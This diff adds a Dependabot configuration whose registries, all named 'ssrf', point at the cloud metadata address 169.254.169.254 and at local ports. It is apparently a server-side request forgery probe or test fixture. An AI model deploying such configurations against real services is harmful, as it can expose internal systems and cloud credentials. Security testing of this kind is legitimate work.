@@ -1,0 +1,24 @@
+version: 2
+registries:
+  npm-ssrf:
+    type: npm-registry
+    url: http://169.254.169.254/
+    token: test
+  maven-ssrf:
+    type: maven-repository
+    url: http://localhost:8080/
+    username: test
+    password: test
+  docker-ssrf:
+    type: docker-registry
+    url: http://127.0.0.1:5000/
+    username: test
+    password: test
+
+updates:
+  - package-ecosystem: npm
+    directory: /
+    schedule:
+      interval: daily
+    registries:
+      - npm-ssrf
